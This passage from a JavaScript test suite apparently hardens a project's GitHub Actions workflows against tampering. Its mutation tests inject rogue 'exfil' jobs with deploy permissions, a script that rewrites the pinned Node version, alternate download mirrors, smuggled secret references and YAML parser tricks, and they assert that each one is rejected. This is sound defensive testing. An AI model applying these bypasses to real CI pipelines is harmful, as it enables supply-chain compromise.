      const tm = getIn(j, 'timeout-minutes')?.value;
      if (!Number.isInteger(tm) || tm < 1 || tm > 15) problems.push(`pin-check timeout-minutes must be an integer in 1..15, got ${JSON.stringify(tm)}`);
      const steps = getIn(j, 'steps');
      auditSteps(problems, steps, 'check', lc, { allowDeployActions: false, allowedActions: PIN_CHECK_ALLOWED_ACTIONS });
      if (isSeq(steps) && !steps.flow) {
        const shape = steps.items.map((s) => (isMap(s) ? keysOf(s).join(',') : '?'));
        const uses = steps.items.map((s) => (isMap(s) ? actionName(usesOf(s) ?? '') : ''));
        if (steps.items.length !== 3 || shape.join(' | ') !== 'name,uses | name,uses,with | name,run' || uses[0] !== 'actions/checkout' || uses[1] !== 'actions/setup-node') {
          problems.push(`pin-check steps must be exactly checkout → setup-node → run (shape name,uses | name,uses,with | name,run), got [${shape.join(' | ')}] using [${uses.filter(Boolean).join(', ')}]`);
        }
        const w = isMap(steps.items[1]) ? getIn(steps.items[1], 'with') : undefined;
        if (isMap(w)) for (const k of keysOf(w)) if (k !== 'node-version-file') problems.push(`pin-check setup-node may only pass node-version-file, found with-key "${k}"`);
        const run = isMap(steps.items[2]) ? strOf(getIn(steps.items[2], 'run')) : undefined;
        if (run !== PIN_CHECK_RUN) problems.push(`pin-check may only run "${PIN_CHECK_RUN}", found: ${JSON.stringify(run)}`);
      }
    }
  }
  for (const p of allPairs(doc)) {
    const k = keyOf(p);
    if (PIN_CHECK_FORBIDDEN_KEYS.includes(k)) problems.push(`pin-check must not use "${k}:" (no shell override, env, containers, services, environments or secrets in the isolated reporter; ${lineOf(lc, p)})`);
    if (k === 'permissions' && p.value !== getIn(root, 'permissions')) problems.push(`pin-check must have exactly one top-level permissions: block (found another at ${lineOf(lc, p)})`);
  }
  for (const s of allStrings(doc)) {
    if (/^write(-all)?$/.test(s.value)) problems.push(`pin-check must not hold any write permission: ${JSON.stringify(s.value)} (${lineOf(lc, s)})`);
    if (/\$\{\{\s*secrets\./.test(s.value) || /GITHUB_TOKEN/.test(s.value)) problems.push(`pin-check must not reference secrets or GITHUB_TOKEN (${lineOf(lc, s)})`);
    if (DEPLOY_ACTIONS.some((a) => s.value.includes(a.slice('actions/'.length)))) problems.push(`pin-check must not contain Pages/deploy actions (${lineOf(lc, s)})`);
  }
  auditGlobalKeys(problems, doc, lc);
  return problems;
}

// CI-5b：canonical form —— 解析後結構（含鍵序）；uses 的 SHA / 版本註解與 cron 以 placeholder 取代。
function toCanonical(node) {
  if (isMap(node)) return Object.fromEntries(node.items.map((p) => [keyOf(p), toCanonical(p.value)]));
  if (isSeq(node)) return node.items.map(toCanonical);
  if (isScalar(node)) return node.value;
  return `<unsupported ${String(node)}>`;
}
export function canonicalPinCheck(text) {
  const { doc } = parseWorkflow(text);
  if (!doc) return null;
  const c = toCanonical(doc.contents);
  const steps = c?.jobs?.check?.steps;
  if (Array.isArray(steps)) {
    for (const [i, s] of steps.entries()) {
      if (typeof s?.uses === 'string') {
        const node = getIn(getIn(getIn(getIn(doc.contents, 'jobs'), 'check'), 'steps').items[i], 'uses');
        s.uses = `${s.uses.replace(/@[0-9a-f]{40}$/, '@SHA')} # ${VERSION_COMMENT_RE.test(node.comment ?? '') ? 'vX' : JSON.stringify(node.comment ?? '')}`;
      }
    }
  }
  const sched = c?.on?.schedule;
  if (Array.isArray(sched) && sched.length === 1 && isFiringWeeklyCron(sched[0]?.cron)) sched[0].cron = 'CRON';
  return JSON.stringify(c);
}
const PIN_CHECK_CANONICAL = JSON.stringify({
  name: 'Node pin check',
  on: { schedule: [{ cron: 'CRON' }], workflow_dispatch: null },
  permissions: { contents: 'read' },
  jobs: {
    check: {
      'runs-on': RUNNER_LABEL,
      'timeout-minutes': 5,
      steps: [
        { name: 'Checkout', uses: 'actions/checkout@SHA # vX' },
        { name: 'Set up Node.js (from .node-version)', uses: 'actions/setup-node@SHA # vX', with: { 'node-version-file': '.node-version' } },
        { name: 'Compare .node-version against the official Node.js release index and schedule', run: PIN_CHECK_RUN },
      ],
    },
  },
});

function mutate(source, from, to) {
  const out = source.replace(from, to);
  assert.notEqual(out, source, `mutation did not apply: ${String(from).slice(0, 60)}`);
  return out;
}
const toJS = (text) => parseWorkflow(text).doc?.toJS();
const has = (problems, re) => problems.some((p) => re.test(p));

// ── 契約 ────────────────────────────────────────────────────────────────────
test('CI-0: both workflow files are exactly one YAML document with zero parse errors/warnings and satisfy the canonical shape policy', () => {
  assert.deepEqual(auditWorkflowYaml(PAGES), []);
  assert.deepEqual(auditWorkflowYaml(PIN_CHECK), []);
  assert.deepEqual(auditSourceText(PAGES, { pinnedLiteral: NODE_VERSION_FILE.trim() }), []);
  assert.deepEqual(auditSourceText(PIN_CHECK, { pinnedLiteral: NODE_VERSION_FILE.trim() }), []);
});

test('CI-1: .node-version is an exact X.Y.Z on the approved major line', () => {
  assert.deepEqual(auditNodeVersionFile(NODE_VERSION_FILE), []);
  assert.match(NODE_VERSION_FILE.trim(), /^22\.\d+\.\d+$/);
});

test('CI-2: pages.yml — canonical shape; every job has exactly one setup-node consuming the parsed string ".node-version" before any run step; no node-version/check-latest key; deploy path only in deploy', () => {
  assert.deepEqual(auditPagesWorkflow(PAGES), []);
  const js = toJS(PAGES);
  for (const job of ['validate', 'browser-smoke', 'deploy']) {
    const setup = js.jobs[job].steps.filter((s) => /^actions\/setup-node@/.test(s.uses ?? ''));
    assert.equal(setup.length, 1, `${job} has one setup-node`);
    assert.equal(setup[0].with['node-version-file'], '.node-version', `${job} consumes the file (parsed value)`);
  }
});

test('CI-3: every runs-on in pages.yml and node-pin-check.yml is the explicit ubuntu-26.04 label; jobs are the canonical ordered set', () => {
  for (const [job, j] of Object.entries(toJS(PAGES).jobs)) assert.equal(j['runs-on'], RUNNER_LABEL, job);
  assert.equal(toJS(PIN_CHECK).jobs.check['runs-on'], RUNNER_LABEL);
  assert.deepEqual(jobNames(PAGES), ['validate', 'browser-smoke', 'deploy']);
  assert.deepEqual(jobNames(PIN_CHECK), ['check']);
});

test('CI-4: every uses: in both workflows is a GitHub-owned action pinned to a 40-hex SHA with a # vX.Y.Z comment (comment read from the parser)', () => {
  // 每個解析出的 uses 鍵（不論位置）都經 usesProblems；數量與原始文字中的 `uses:` 行數一致（沒有 uses 被解析遺漏）
  for (const [text, expected] of [[PAGES, 10], [PIN_CHECK, 2]]) {
    const { doc, lineCounter } = parseWorkflow(text);
    const usesPairs = allPairs(doc).filter((p) => keyOf(p) === 'uses');
    assert.equal(usesPairs.length, expected, `parsed uses count`);
    assert.equal((text.match(/^\s*(?:- )?uses:/gm) || []).length, expected, 'source uses: lines');
    for (const p of usesPairs) assert.deepEqual(usesProblems(p.value, 'uses', lineCounter), []);
  }
  // 生產稽核也不得回報任何 uses 問題
  assert.deepEqual(auditPagesWorkflow(PAGES).filter((p) => /uses/.test(p)), []);
  assert.deepEqual(auditPinCheckWorkflow(PIN_CHECK).filter((p) => /uses/.test(p)), []);
});

test('CI-5: node-pin-check.yml is isolated — schedule/dispatch only, contents: read only, no write/secrets/shell/env, fixed checkout→setup-node→run shape, one job, timeout', () => {
  assert.deepEqual(auditPinCheckWorkflow(PIN_CHECK), []);
  const sha = (t) => t.match(/^\s*uses:\s*actions\/setup-node@([0-9a-f]{40})/m)[1];
  assert.equal(sha(PIN_CHECK), sha(PAGES));
});

test('CI-5b: node-pin-check.yml canonical form (parsed structure, key order included) equals the frozen template (only action SHA/version comments and the cron may vary)', () => {
  assert.equal(canonicalPinCheck(PIN_CHECK), PIN_CHECK_CANONICAL);
});

// ── known-bad 臂 ────────────────────────────────────────────────────────────
// 錨點（新的 pages.yml 文字）：validate 的 with 區塊是第一個出現的 `node-version-file + cache` 區塊；deploy 的 with 區塊後接 Configure Pages。
const WITH_VALIDATE = /        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n/;
const SETUP_VALIDATE = /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n\n      - name: Generate task manifest/;
const SETUP_DEPLOY = /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n\n      - name: Configure Pages/;
const SHA = PAGES.match(/^\s*uses:\s*actions\/setup-node@([0-9a-f]{40})/m)[1];

test('CI-6a (Codex r8 F1): a quoted "#" inside node-version-file parses to a literal string containing "#" and is rejected because it is not exactly ".node-version"', () => {
  for (const q of ['"', "'"]) {
    const t = mutate(PAGES, WITH_VALIDATE, `        with:\n          node-version-file: ${q}.node-version # x${q}\n          cache: "npm"\n`);
    assert.deepEqual(auditWorkflowYaml(t), [], 'the mutation is valid YAML inside the canonical shape (a quoted scalar)');
    assert.equal(toJS(t).jobs.validate.steps[1].with['node-version-file'], '.node-version # x', 'the parser yields the literal string with the "#" — it is NOT a comment');
    const p = auditPagesWorkflow(t);
    assert.ok(has(p, /job "validate" step #2 \(setup-node\) node-version-file must be exactly the string "\.node-version" \(parsed value: "\.node-version # x"\)/), `quoted # must be RED (${q}): ${p.join(' | ')}`);
  }
  // 對照：真正的尾註解不是值的一部分 → 解析後仍是 ".node-version" → GREEN（解析器語義正確，稽核不誤判）
  const commented = mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: .node-version # x\n          cache: "npm"\n');
  assert.equal(toJS(commented).jobs.validate.steps[1].with['node-version-file'], '.node-version');
  assert.deepEqual(auditPagesWorkflow(commented), []);
  // 控制組：無 # 的錯檔名 → RED；指向另一個真實檔案 → RED
  for (const v of ['".node-version-x"', '"package.json # x"', '.node-version-24', '".node-version\\n"']) {
    assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, `        with:\n          node-version-file: ${v}\n          cache: "npm"\n`)), /node-version-file must be exactly the string/), `control not RED: ${v}`);
  }
});

test('CI-6b: setup-node with-block arms — literal node-version in every spelling, check-latest, mirror/registry, env smuggling, flow with, missing/malformed with, cache value', () => {
  // (a) literal node-version re-introduced, in bare / quoted / spaced / cased forms → RED (cased key = valid YAML, rejected by AI Arena canonical workflow policy)
  for (const variant of ['node-version: "22.23.4"', '"node-version": "24.22.1"', 'node-version : "24"', 'Node-Version: "24"']) {
    const t = mutate(PAGES, WITH_VALIDATE, `        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          ${variant}\n`);
    const p = auditPagesWorkflow(t);
    assert.ok(has(p, /node-version key|quoted key "node-version"|key "Node-Version" is not a plain lowercase identifier/), `variant not caught: ${variant}: ${p.join(' | ')}`);
  }
  assert.equal(toJS(mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          node-version : "24"\n')).jobs.validate.steps[1].with['node-version'], '24', 'spaces before the colon do not change the parsed key');
  // (b) check-latest in any boolean spelling → RED; other non-allowlisted with-keys (mirror → alternate download host) → RED
  for (const variant of ['check-latest: true', 'check-latest: "true"', 'check-latest: True', 'mirror: https://example.invalid', 'mirror-token: ${{ secrets.X }}', 'registry-url: https://example.invalid']) {
    const t = mutate(PAGES, WITH_VALIDATE, `        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          ${variant}\n`);
    assert.ok(has(auditPagesWorkflow(t), /check-latest|not allowlisted/), `with-key variant not caught: ${variant}`);
  }
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          Check-Latest: True\n')), /not a plain lowercase identifier/), 'cased key is rejected by policy');
  // (b′) env smuggle + flow with → RED (flow mapping = valid YAML, rejected by policy; env on setup-node; no node-version-file under with)
  const envSmuggle = mutate(PAGES, WITH_VALIDATE, '        env:\n          node-version-file: ".node-version"\n        with: { node-version: "24" }\n');
  const es = auditPagesWorkflow(envSmuggle);
  assert.ok(has(es, /flow-style mapping/) && has(es, /keys outside \{name, uses, with\}.*env/) && has(es, /node-version key/), `env-smuggle + flow with must be rejected: ${es.join(' | ')}`);
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        env:\n          node-version-file: ".node-version"\n')), /has no with: block/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        with:\n          cache: "npm"\n        env:\n          node-version-file: ".node-version"\n')), /with: block does not consume node-version-file/));
  // (b″) `with: # comment` header + mirror → still RED (comments are not structure for the parser)
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        with: # x\n          node-version-file: ".node-version"\n          cache: "npm"\n          mirror: https://example.invalid\n')), /not allowlisted.*"mirror"/));
  // malformed with: scalar / empty / sequence → RED
  for (const w of ['        with: ".node-version"\n', '        with:\n', '        with:\n          - node-version-file: ".node-version"\n']) {
    assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, w)), /with: must be a block mapping|has no with: block|block sequence item is not a mapping/), `malformed with not caught: ${JSON.stringify(w)}`);
  }
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          cache: "yarn"\n')), /cache must be exactly "npm"/));
  assert.deepEqual(auditPagesWorkflow(PAGES), [], 'the real cache: "npm" key stays allowed');
});

test('CI-6c: parser-bypass families of the retired lexer — explicit keys, escaped/quoted keys, duplicate keys (incl. case variants), block-scalar counterfeit, multi-line scalars, impersonation by name/comment, step keys, ordering, container', () => {
  // explicit `? node-version` / `: "24.22.1"` — the parser resolves the input node-version (proved) → policy RED + semantic RED
  const explicitKey = mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          ? node-version\n          : "24.22.1"\n');
  assert.equal(toJS(explicitKey).jobs.validate.steps[1].with['node-version'], '24.22.1', 'explicit key resolves to the real input');
  const ek = auditPagesWorkflow(explicitKey);
  assert.ok(has(ek, /explicit key \("\? key"\).*valid YAML, rejected by AI Arena canonical workflow policy/) && has(ek, /node-version key/), ek.join(' | '));
  // escape-bearing quoted key "mi\u0072ror" — the parser resolves mirror (proved) → policy RED (quoted key) + semantic RED (allowlist)
  const escapedKey = mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          "mi\\u0072ror": https://example.invalid\n');
  assert.equal(toJS(escapedKey).jobs.validate.steps[1].with.mirror, 'https://example.invalid');
  const qk = auditPagesWorkflow(escapedKey);
  assert.ok(has(qk, /quoted key "mirror".*valid YAML, rejected by AI Arena canonical workflow policy/) && has(qk, /not allowlisted.*"mirror"/), qk.join(' | '));
  // duplicate mappings: two with: blocks in one step → parse error (uniqueKeys); Cache/cache → policy (non-lowercase key); a `- id:`-first step is still inventoried
  const dupWith = mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n        with:\n          node-version: "24"\n');
  assert.ok(has(auditPagesWorkflow(dupWith), /\[yaml parse error\] DUPLICATE_KEY/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          Cache: "npm"\n')), /key "Cache" is not a plain lowercase identifier/));
  const idFirst = mutate(PAGES, SETUP_VALIDATE, '      - id: n\n        uses: actions/setup-node@$1 # v7.1.0\n        with:\n          node-version-file: ".node-version"\n          mirror: https://example.invalid\n\n      - name: Generate task manifest');
  assert.ok(has(auditPagesWorkflow(idFirst), /not allowlisted.*"mirror"/), 'a step starting with `- id:` must still be inventoried');
  // (Codex r7 F1) block-scalar counterfeit: `- name: |` carrying fake setup-node text; the parser sees a name string + run → 0 real setup-node in validate → RED
  const counterfeit = mutate(PAGES, SETUP_VALIDATE, '      - name: |\n          Set up Node.js\n          uses: actions/setup-node@$1 # v7.1.0\n          with:\n            node-version-file: ".node-version"\n        run: echo counterfeit\n\n      - name: Generate task manifest');
  const cjs = toJS(counterfeit);
  assert.deepEqual(Object.keys(cjs.jobs.validate.steps[1]), ['name', 'run'], 'the counterfeit step has only name + run');
  const cp = auditPagesWorkflow(counterfeit);
  assert.ok(has(cp, /block scalar \("\|" \/ ">"\) under key "name"/) && has(cp, /job "validate" must have exactly one setup-node step consuming \.node-version, found 0/), cp.join(' | '));
  // the real run: | block scalar is accepted; `key:`-looking lines inside it are scalar content, not structure
  assert.ok(toJS(PAGES).jobs.validate.steps.some((s) => typeof s.run === 'string' && s.run.includes('git diff --exit-code')));
  assert.deepEqual(auditWorkflowYaml('jobs:\n  a:\n    steps:\n      - run: |\n          x: y\n          ? z\n          uses: actions/setup-node@x\n'), []);
  // multi-line quoted / plain scalars → policy RED (and no setup-node → semantic RED); multi-line flow seq with a mapping item → RED
  const quotedSpan = mutate(PAGES, SETUP_VALIDATE, '      - name: "Set up\n          uses: actions/setup-node@$1 # v7.1.0"\n        run: echo counterfeit\n\n      - name: Generate task manifest');
  const qs = auditPagesWorkflow(quotedSpan);
  assert.ok(has(qs, /multi-line scalar under key "name"/) && has(qs, /found 0/), qs.join(' | '));
  assert.ok(has(auditWorkflowYaml("a: 'x\n  uses: y'\n"), /multi-line scalar/));
  const flowSpan = mutate(PAGES, SETUP_VALIDATE, '      - name: Set up Node.js\n        uses: actions/setup-node@$1 # v7.1.0\n        with: [\n          node-version-file: ".node-version" ]\n\n      - name: Generate task manifest');
  const fs = auditPagesWorkflow(flowSpan);
  assert.ok(has(fs, /flow-style sequence with non-scalar items/) && has(fs, /with: must be a block mapping/), fs.join(' | '));
  assert.ok(has(auditWorkflowYaml('a: {\n  b: 1 }\n'), /flow-style mapping/));
  // next-line scalar value is plain YAML for the parser (node-version: "24") → semantic RED
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, WITH_VALIDATE, '        with:\n          node-version-file: ".node-version"\n          node-version:\n            "24"\n')), /node-version key/));
  // (Grok r7 F1) impersonation: a checkout step whose quoted name / trailing comment carries `uses: actions/setup-node@…` → only the uses KEY counts → RED
  const CHECKOUT_TO_SETUP = /      - name: Checkout\n        uses: actions\/checkout@([0-9a-f]{40}) # v7\.0\.1\n\n([\s\S]*?)      - name: Set up Node\.js\n        uses: actions\/setup-node@[0-9a-f]{40} # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n\n      - name: Generate task manifest/;
  for (const nameLine of [`      - name: "uses: actions/setup-node@${SHA}"`, `      - name: Checkout # uses: actions/setup-node@${SHA}`]) {
    const t = mutate(PAGES, CHECKOUT_TO_SETUP, `${nameLine}\n        uses: actions/checkout@$1 # v7.0.1\n        with:\n          node-version-file: ".node-version"\n\n$2      - name: Generate task manifest`);
    assert.deepEqual(auditWorkflowYaml(t), [], 'the impersonation is valid canonical-shape YAML — the semantic audit must catch it');
    assert.ok(has(auditPagesWorkflow(t), /job "validate" must have exactly one setup-node step consuming \.node-version, found 0/), `impersonation not caught: ${nameLine.trim()}`);
  }
  assert.ok(has(auditWorkflowYaml(mutate(PAGES, CHECKOUT_TO_SETUP, `      - name: uses: actions/setup-node@${SHA}\n        uses: actions/checkout@$1 # v7.0.1\n\n$2      - name: Generate task manifest`)), /\[yaml parse error\]/), 'the unquoted plain form is invalid YAML');
  // (Grok r7 F2) `if: false` (GitHub skips the step), `continue-on-error: true`, `env:`, timeout-minutes, id on a setup-node step → RED
  for (const extraKey of ['if: false', 'if: ${{ false }}', 'continue-on-error: true', 'timeout-minutes: 1', 'id: n', 'env:\n          A: b']) {
    const t = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@/, `      - name: Set up Node.js\n        ${extraKey}\n        uses: actions/setup-node@`);
    assert.ok(has(auditPagesWorkflow(t), /\(setup-node\) carries keys outside \{name, uses, with\}/), `extra step key not caught: ${extraKey}`);
  }
  // ordering: a run: step before setup-node → RED; container:/services: on a pages.yml job → RED (job key allowlist)
  const reordered = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n\n      - name: Generate task manifest\n        run: node scripts\/build-manifest\.mjs --strict\n/, '      - name: Generate task manifest\n        run: node scripts/build-manifest.mjs --strict\n\n      - name: Set up Node.js\n        uses: actions/setup-node@$1 # v7.1.0\n        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n');
  const ro = auditPagesWorkflow(reordered);
  assert.ok(has(ro, /job "validate": a run: step precedes the setup-node step/) && has(ro, /job "validate" step #2 must be the setup-node step/), ro.join(' | '));
  // canonical prologue + closed action set (Grok r8 F1 family, dispositioned W-1 but foreclosed by shape): github-script before setup-node,
  // checkout with repository override, an extra pinned action after setup-node, setup-node not second → all RED
  const scriptFirst = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n/, '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n        with:\n          script: require("fs").writeFileSync(".node-version", "24.22.1\\n")\n      - name: Set up Node.js\n        uses: actions/setup-node@$1 # v7.1.0\n        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n');
  const sf = auditPagesWorkflow(scriptFirst);
  assert.ok(has(sf, /step #2 must be the setup-node step/) && has(sf, /uses an action outside the closed set .*actions\/github-script/), sf.join(' | '));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Checkout\n        uses: actions\/checkout@([0-9a-f]{40}) # v7\.0\.1\n\n      # Node is pinned/, '      - name: Checkout\n        uses: actions/checkout@$1 # v7.0.1\n        with:\n          repository: someone/else\n\n      # Node is pinned')), /step #1 must be the plain repository checkout/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Scan submissions for secrets\n/, '      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n      - name: Scan submissions for secrets\n')), /uses an action outside the closed set .*actions\/setup-python/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Checkout\n        uses: actions\/checkout@([0-9a-f]{40}) # v7\.0\.1\n\n      # Node is pinned/, '      - run: echo first\n      - name: Checkout\n        uses: actions/checkout@$1 # v7.0.1\n\n      # Node is pinned')), /step #1 must be the plain repository checkout/));
  for (const k of ['container: node:24', 'services:\n      db:\n        image: x', 'env:\n      A: b', 'defaults:\n      run:\n        shell: bash', 'if: false', 'timeout-minutes: 30']) {
    assert.ok(has(auditPagesWorkflow(mutate(PAGES, /  validate:\n    runs-on: ubuntu-26\.04\n/, `  validate:\n    runs-on: ubuntu-26.04\n    ${k}\n`)), /job "validate" carries keys outside \{runs-on, steps\}/), `job key not caught: ${k}`);
  }
});

test('CI-6d: structure/policy arms — fewer setup-node, rolling alias, tag/third-party pins, extra/anchored/flow/aliased jobs, merge keys, tags, document markers, directives, tabs, plain sequence items, trigger set, permissions, deploy path', () => {
  // (c) a job dropped its setup-node → per-job RED
  const fewer = mutate(PAGES, SETUP_DEPLOY, '      - name: Configure Pages');
  assert.ok(has(auditPagesWorkflow(fewer), /job "deploy" must have exactly one setup-node step consuming \.node-version, found 0/));
  // (d) rolling alias → RED (runs-on exact) ; alias inside a run string → RED too
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /runs-on: ubuntu-26\.04/, 'runs-on: ubuntu-latest')), /runs-on must be exactly "ubuntu-26\.04"/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /run: npm ci\n/, 'run: echo ubuntu-latest\n')), /references the rolling alias ubuntu-latest/));
  // (e) tag-pinned / third-party / unpinned-comment action → CI-4 RED
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /actions\/checkout@[0-9a-f]{40} # v7\.0\.1/, 'actions/checkout@v7')), /not pinned to a 40-hex/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /actions\/checkout@/, 'someone/checkout@')), /not a GitHub-owned action/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, / # v7\.0\.1\n/, '\n')), /lacks the "# vX\.Y\.Z" release comment/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /uses: actions\/checkout@([0-9a-f]{40}) # v7\.0\.1\n/, 'uses: "actions/checkout@$1 # v7.0.1"\n')), /not pinned to a 40-hex/), 'a quoted "# vX" is part of the value, not a comment');
  // (f) extra jobs: underscore id, quoted id, id with trailing comment, no setup-node, with deploy perms → RED
  for (const header of ['  pin_audit:', '  "exfil":', '  exfil: # note']) {
    const t = mutate(PAGES, /\njobs:\n/, `\njobs:\n${header}\n    runs-on: ubuntu-26.04\n    permissions:\n      pages: write\n      id-token: write\n    steps:\n      - run: echo hi\n`);
    const p = auditPagesWorkflow(t);
    assert.ok(has(p, /jobs carries keys outside \{validate, browser-smoke, deploy\}/), `extra job not caught: ${header}: ${p.join(' | ')}`);
  }
  assert.equal(jobNames(mutate(PAGES, /\njobs:\n/, '\njobs:\n  exfil: # note\n    runs-on: x\n')).length, 4, 'commented job id is still inventoried by the parser');
  // (f′) anchored / flow-style / aliased job definitions and merge keys → policy RED (never interpreted)
  const anchored = mutate(PAGES, /\njobs:\n/, '\njobs:\n  exfil: &exfil\n    runs-on: ubuntu-26.04\n    permissions:\n      pages: write\n      id-token: write\n    steps:\n      - uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n');
  const pa = auditPagesWorkflow(anchored);
  assert.ok(has(pa, /anchor "&exfil".*valid YAML, rejected by AI Arena canonical workflow policy/) && has(pa, /jobs carries keys outside/), 'anchored job must be rejected');
  const flow = mutate(PAGES, /\njobs:\n/, '\njobs:\n  exfil: { runs-on: ubuntu-26.04, permissions: { pages: write, id-token: write }, steps: [ { run: echo hi } ] }\n');
  assert.ok(has(auditPagesWorkflow(flow), /flow-style mapping/), 'flow-style job must be rejected');
  const aliased = mutate(PAGES, /  deploy:\n    if:/, '  deploy: &deploy\n    if:').replace(/\njobs:\n/, '\njobs:\n  exfil: *deploy\n');
  const al = auditPagesWorkflow(aliased);
  assert.ok(has(al, /alias "\*deploy"/) && has(al, /anchor "&deploy"/), al.join(' | '));
  const mergeKey = mutate(PAGES, /  browser-smoke:\n    runs-on: ubuntu-26\.04\n/, '  browser-smoke:\n    runs-on: ubuntu-26.04\n    <<: *x\n');
  assert.ok(has(auditPagesWorkflow(mergeKey), /\[yaml parse error\]|key "<<" is not a plain lowercase identifier/), 'merge key must be rejected');
  assert.ok(has(auditWorkflowYaml('base: &b\n  k: v\nx:\n  <<: *b\n'), /key "<<" is not a plain lowercase identifier/), 'merge keys are never merged (merge: false) and the key itself is rejected');
  // explicit tags, document markers, directives, tabs, plain sequence items, multiple documents, empty, scalar root
  assert.ok(has(auditWorkflowYaml(mutate(PAGES, /runs-on: ubuntu-26\.04\n    steps:/, 'runs-on: !!str ubuntu-26.04\n    steps:')), /explicit tag "tag:yaml\.org,2002:str"/));
  assert.ok(has(auditWorkflowYaml('a: !foo 1\n'), /\[yaml parse warning, fail closed\] TAG_RESOLVE_FAILED/));
  assert.ok(has(auditWorkflowYaml(`---\n${PAGES}`), /document start marker "---"/));
  assert.ok(has(auditWorkflowYaml(`${PAGES}...\n`), /document end marker "\.\.\."/));
  assert.ok(has(auditWorkflowYaml(`%YAML 1.2\n---\n${PAGES}`), /%YAML directive/));
  assert.ok(has(auditWorkflowYaml('%TAG !e! tag:example.com,2000:\n---\na: 1\n'), /%TAG directive/));
  assert.ok(has(auditWorkflowYaml(`${PAGES}---\nname: second\n`), /2 YAML documents in one file/));
  assert.ok(has(auditWorkflowYaml(''), /no YAML document/));
  assert.ok(has(auditWorkflowYaml('# only a comment\n'), /no YAML document/));
  assert.ok(has(auditWorkflowYaml('just a string\n'), /root is not a block mapping/));
  assert.ok(has(auditWorkflowYaml('- a\n'), /root is not a block mapping/));
  assert.ok(has(auditWorkflowYaml('jobs:\n\tx: 1\n'), /\[yaml parse error\] TAB_AS_INDENT/));
  assert.ok(has(auditWorkflowYaml("'on':\n  push:\n"), /quoted key "on"/));
  assert.ok(has(auditWorkflowYaml('steps:\n  - echo\n'), /block sequence item is not a mapping/));
  assert.ok(has(auditWorkflowYaml('1: x\n'), /key 1 is not a plain lowercase identifier/));
  assert.ok(has(auditWorkflowYaml('a: 1\nb\n'), /\[yaml parse error\]/));
  assert.ok(has(auditWorkflowYaml('a:\n  b: 1\n c: 2\n'), /\[yaml parse error\] BAD_INDENT/));
  // source-text canonical requirements: BOM, CRLF, trailing newline, patch literal (comment or value)
  assert.ok(has(auditSourceText(`\uFEFF${PAGES}`), /BOM/));
  assert.ok(has(auditSourceText(PAGES.replace(/\n/g, '\r\n')), /LF line endings/));
  assert.ok(has(auditSourceText(`${PAGES}\n`), /exactly one trailing newline/));
  assert.ok(has(auditSourceText(PAGES.replace(/\n$/, '')), /exactly one trailing newline/));
  assert.ok(has(auditSourceText(mutate(PAGES, /# Run on every PR and push/, '# pinned 22.23.4'), { pinnedLiteral: '22.23.4' }), /patch literal "22\.23\.4" must not appear/));
  // trigger set, workflow permissions, deploy gating, deploy path outside deploy, job-level permissions on validate → RED
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /  workflow_dispatch:\n/, '  workflow_dispatch:\n  pull_request_target:\n    branches: ["main"]\n')), /on carries keys outside \{push, pull_request, workflow_dispatch\}: pull_request_target/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /    branches: \["main"\]\n  pull_request:/, '    branches: ["main", "release/*"]\n  pull_request:')), /on\.push\.branches must be exactly \["main"\]/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /\npermissions:\n  contents: read\n/, '\npermissions:\n  contents: write\n')), /workflow permissions\.contents must be exactly "read"/));
